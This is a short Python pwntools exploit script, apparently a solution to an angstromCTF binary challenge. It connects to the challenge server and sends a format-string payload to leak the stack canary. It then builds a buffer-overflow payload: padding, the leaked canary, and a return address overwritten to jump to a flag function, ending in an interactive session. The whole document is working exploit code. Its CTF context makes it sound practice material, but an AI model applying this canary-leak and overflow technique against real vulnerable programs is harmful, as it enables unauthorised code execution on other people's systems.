#Python2.7 only ! Python3 is pure garbage when it come to handle bytes strings

from pwn import *
from struct import pack

conn = remote("shell.actf.co", 20701)

f_string = "%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx"
payload = ""

pad = "A" * 56

conn.sendline(f_string)

leak = conn.recvuntil("Anything")

canary = str(leak).split("Nice to meet you, ")[1].split("!")[0].split("-")[-1]
print("[+] Canary found: " + canary)

canary_little_indian = p64(int(canary, 16))
junk = "BBBBBBBB"
flag_func = "\x87\x07\x40\x00\x00\x00\x00\x00"

payload += pad
payload += canary_little_indian
payload += junk
payload += flag_func

conn.sendline(payload)

conn.interactive()
